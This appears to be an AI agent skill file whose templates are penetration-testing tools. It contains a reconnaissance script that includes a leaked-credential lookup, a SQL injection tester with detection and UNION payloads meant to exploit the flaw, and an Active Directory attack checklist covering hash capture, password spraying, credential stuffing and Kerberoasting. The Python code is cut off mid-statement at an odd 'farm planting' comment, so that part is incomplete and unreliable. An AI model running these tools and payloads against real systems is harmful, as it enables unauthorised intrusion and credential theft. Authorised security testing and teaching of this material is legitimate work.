---
name: deliverables
description: "Use when producing templates, examples, or technical artifacts."
version: 1.0.0
---

# Your Technical Deliverables

External Reconnaissance Automation
```bash
#!/bin/bash
# External attack surface enumeration script
# Usage: ./recon.sh target-domain.com

TARGET="$1"
OUT="recon-${TARGET}-$(date +%Y%m%d)"
mkdir -p "$OUT"

echo "=== Subdomain Enumeration ==="
# Passive: multiple sources, merge and deduplicate
subfinder -d "$TARGET" -silent -o "$OUT/subs-subfinder.txt"
amass enum -passive -d "$TARGET" -o "$OUT/subs-amass.txt"
cat "$OUT"/subs-*.txt | sort -u > "$OUT/subdomains.txt"
echo "[+] Found $(wc -l < "$OUT/subdomains.txt") unique subdomains"

echo "=== DNS Resolution & HTTP Probing ==="
# Resolve live hosts and probe for HTTP services
dnsx -l "$OUT/subdomains.txt" -a -resp -silent -o "$OUT/resolved.txt"
httpx -l "$OUT/subdomains.txt" -status-code -title -tech-detect \
  -follow-redirects -silent -o "$OUT/http-services.txt"

echo "=== Port Scanning (Top 1000) ==="
naabu -list "$OUT/subdomains.txt" -top-ports 1000 \
  -silent -o "$OUT/open-ports.txt"

echo "=== Technology Fingerprinting ==="
# Identify frameworks, CMS, WAFs — use httpx output (full URLs, not bare hostnames)
whatweb -i "$OUT/http-services.txt" \
  --log-json="$OUT/tech-fingerprint.json" --aggression=3

echo "=== Screenshot Capture ==="
gowitness file -f "$OUT/http-services.txt" \
  --screenshot-path "$OUT/screenshots/"

echo "=== Credential Leak Check ==="
# Search for leaked credentials (requires API keys)
h8mail -t "@${TARGET}" -o "$OUT/credential-leaks.txt"

echo "[+] Recon complete: results in $OUT/"
```

### Web Application SQL Injection Testing
```python
#!/usr/bin/env python3
"""
Manual SQL injection testing methodology.
Not a scanner — a structured approach to confirm and exploit SQLi.
"""

import requests
from urllib.parse import quote

class SQLiTester:
    """Test SQL injection vectors against a target parameter."""

    # Detection payloads — ordered by stealth (least suspicious first)
    DETECTION_PAYLOADS = [
        # Boolean-based: if the response changes, injection is likely
        ("' AND '1'='1", "' AND '1'='2"),
        # Error-based: trigger verbose database errors
        ("'", "' OR '"),
        # Time-based blind: if no visible change, use delays
        ("' AND SLEEP(5)-- -", "' AND SLEEP(0)-- -"),       # MySQL
        ("'; WAITFOR DELAY '0:0:5'-- -", ""),                # MSSQL
        ("' AND pg_sleep(5)-- -", ""),                        # PostgreSQL
    ]

    # UNION-based column enumeration
    UNION_PROBES = [
        "' UNION SELECT {cols}-- -",
        "' UNION ALL SELECT {cols}-- -",
        "') UNION SELECT {cols}-- -",
    ]

    def __init__(self, target_url: str, param: str, method: str = "GET"):
        self.target_url = target_url
        self.param = param
        self.method = method
        self.session = requests.Session()
        self.session.headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
# … truncated for farm planting — see upstream for the full sample
```

### Active Directory Attack Chain Playbook
```markdown
# Active Directory Penetration Testing Playbook

## Phase 1: Initial Access & Foothold
- [ ] LLMNR/NBT-NS poisoning with Responder — capture NTLMv2 hashes on the wire
- [ ] Password spraying against discovered accounts (3 attempts max per lockout window)
- [ ] Kerberos AS-REP roasting — extract hashes for accounts with pre-auth disabled
- [ ] Check for public-facing services with default/weak credentials
- [ ] Test VPN/RDP endpoints for credential stuffing from breach databases

## Phase 2: Enumeration (Post-Foothold)
- [ ] BloodHound collection — map all AD relationships, trusts, and attack paths
- [ ] Enumerate SPNs for Kerberoastable service accounts
- [ ] Identify Group Policy Preferences (GPP) passwords in SYSVOL
- [ ] Map local admin access across workstations and servers
- [ ] Find shares with sensitive data: \\server\backup, \\server\IT, password files

## Phase 3: Privilege Escalation
- [ ] Kerberoast high-value SPNs — crack service account hashes offline
- [ ] Abuse misconfigured ACLs: GenericAll, GenericWrite, WriteDACL on users/groups
- [ ] Exploit unconstrained delegation — compromise servers to capture TGTs
- [ ] Resource-based constrained delegation (RBCD) attack if write access to computer objects
- [ ] Print Spooler abuse (PrinterBug) to coerce authentication from DCs

## Phase 4: Lateral Movement…